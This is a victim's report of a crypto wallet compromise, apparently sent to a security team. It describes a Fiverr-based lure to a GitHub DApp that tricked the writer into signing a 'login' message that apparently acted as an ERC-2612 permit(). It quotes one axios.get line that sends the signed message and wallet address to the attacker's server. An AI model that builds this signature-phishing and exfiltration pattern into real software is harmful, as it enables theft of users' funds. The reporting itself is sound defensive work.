## Details

Hello,

I am reporting a wallet compromise that appears to be the result of a targeted phishing attack involving a malicious DApp.

The attacker, or someone working with them, first contacted me via Fiverr under the profile eduardo1124212, requesting assistance on a development project. As part of the project, I was invited to interact with a private GitHub repository and run the associated DApp locally. The repository is - https://github.com/BbaudConferenceDV/Monkey-M

During usage, I was prompted to connect my MetaMask wallet and sign a message under the pretense of "logging in." At no point was I informed that the signature would authorize any kind of token permission.

Hours later, I discovered an unauthorized permit() transaction from my wallet:

The signature I provided was likely crafted in such a way as to act as a valid ERC-2612 permit() call, allowing the attacker to transfer my tokens without further authorization.

I strongly believe this DApp is malicious and designed to trick users into unknowingly signing off-chain messages that grant on-chain permissions.

Please investigate this address, flag it as malicious, and take any actions necessary to prevent further victims.

Thank you for your time and support.

The interact.js file includes some MetaMask interactions that could be abused if paired with malicious logic:

It uses window.ethereum.request with the personal_sign method. This can be used to trick users into signing arbitrary messages ‚Äî which can be used in phishing attacks to authorize malicious DApps or trigger gasless transactions with off-chain signatures.

It also connects to the wallet and fetches addresses.

This confirms that signed wallet messages are sent to a server via a GET request:

axios.get(`checkLoginMessage.php?publicKey=${walletAddress}&signedMessage=${signedMessage}&print=${fingerPrintStr}`);
